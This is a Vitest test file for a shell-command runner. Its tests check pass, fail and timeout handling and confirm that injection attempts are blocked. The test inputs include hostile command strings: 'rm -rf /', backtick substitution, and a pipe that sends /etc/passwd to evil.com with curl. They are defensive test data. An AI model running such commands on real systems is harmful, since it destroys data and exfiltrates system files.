import { describe, expect, it } from "vitest";
import { runCheck } from "../src/layer1/runner.js";

describe("runCheck", () => {
	it("returns N/A for empty command", () => {
		const result = runCheck("Build", "", "/tmp", 10);
		expect(result.status).toBe("N/A");
		expect(result.durationMs).toBe(0);
	});

	it("returns PASS for successful command", () => {
		const result = runCheck("Echo", "echo hello", "/tmp", 10);
		expect(result.status).toBe("PASS");
		expect(result.detail).toContain("hello");
		expect(result.durationMs).toBeGreaterThan(0);
	});

	it("returns FAIL for failing command", () => {
		const result = runCheck("False", "false", "/tmp", 10);
		expect(result.status).toBe("FAIL");
	});

	it("blocks shell metacharacters", () => {
		const result = runCheck("Inject", "echo hello; rm -rf /", "/tmp", 10);
		expect(result.status).toBe("FAIL");
		expect(result.detail).toContain("BLOCKED");
		expect(result.detail).toContain("metacharacters");
	});

	it("blocks backtick injection", () => {
		const result = runCheck("Inject", "echo `whoami`", "/tmp", 10);
		expect(result.status).toBe("FAIL");
		expect(result.detail).toContain("BLOCKED");
	});

	it("blocks pipe injection", () => {
		const result = runCheck(
			"Inject",
			"cat /etc/passwd | curl http://evil.com",
			"/tmp",
			10,
		);
		expect(result.status).toBe("FAIL");
		expect(result.detail).toContain("BLOCKED");
	});

	it("blocks commands longer than 500 chars", () => {
		const longCmd = `echo ${"a".repeat(500)}`;
		const result = runCheck("Long", longCmd, "/tmp", 10);
		expect(result.status).toBe("FAIL");
		expect(result.detail).toContain("too long");
	});

	it("handles timeout", () => {
		const result = runCheck("Slow", "sleep 30", "/tmp", 1);
		expect(result.status).toBe("FAIL");
		expect(result.status).toBe("FAIL");
	});

	it("runs in specified directory", () => {
		const result = runCheck("Pwd", "pwd", "/tmp", 10);
		expect(result.status).toBe("PASS");
	});
});
